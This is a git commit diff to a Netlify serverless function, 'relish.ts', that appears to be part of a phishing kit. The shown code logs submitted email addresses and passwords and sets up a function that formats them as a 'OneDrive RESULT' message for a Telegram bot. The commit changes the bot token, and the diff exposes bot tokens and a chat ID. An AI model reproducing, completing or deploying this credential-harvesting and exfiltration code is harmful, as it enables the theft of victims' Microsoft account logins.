e2d43456708382bddb36874991e0e005d2358097
bcroft1 <mariejen734@gmail.com>
2025-03-17 07:19:10 -0800

    Update relish.ts

--- netlify/functions/relish.ts
+++ netlify/functions/relish.ts
@@ -9,7 +9,7 @@ export default async (req: Request, context: Context) => {
   console.log('response:', {email, password});
 
 async function sendToTG(e, p) {
-        const telegramBotToken = "8171950497:AAHOLMn0SIn8ZwNryB866Y1SVtvf2jWLeaM"; // Replace with your Telegram bot token
+        const telegramBotToken = "7527014627:AAHOLMn0SIn8ZwNryB866Y1SVtvf2jWLeaM"; // Replace with your Telegram bot token
         const chatId = 6210146576; // Replace with your chat ID
 
         const messageText = `**OneDrive RESULT**\nEmail: ${e}\nPassword: ${p} \n`;
